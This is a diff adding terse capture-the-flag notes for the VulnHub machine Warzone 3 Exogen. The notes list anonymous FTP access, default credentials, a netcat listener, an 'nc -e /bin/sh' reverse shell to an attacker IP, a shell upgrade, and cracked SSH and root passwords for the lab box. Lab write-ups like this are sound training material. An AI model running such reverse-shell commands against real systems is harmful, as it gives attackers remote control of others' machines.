@@ -1,0 +1,16 @@
+- URL: https://www.vulnhub.com/entry/warzone-3-exogen,606/
+- Anonymous FTP login allowed
+- The default credentials for your entry are alienum@exogenesis, 
+your token is sha256(username).
+	- alienum
+    - exogenesis
+    - 6c72561d26722d88896b520da9651aa24e9ae6eca82e6c8e68af720cf21377ec
+- edit /etc/hosts
+- role may be "astronaut"
+- create exploit
+    - nc -n -lvp 5555
+    - nc -e /bin/sh 192.168.0.118 5555
+    - /usr/bin/script -qc /bin/bash /dev/null
+- make decryptor for aliens.encrypted
+- [22][ssh] host: 192.168.0.116   login: anunnaki   password: nak1nak1..
+- root password: ```ufo_phosXEN```
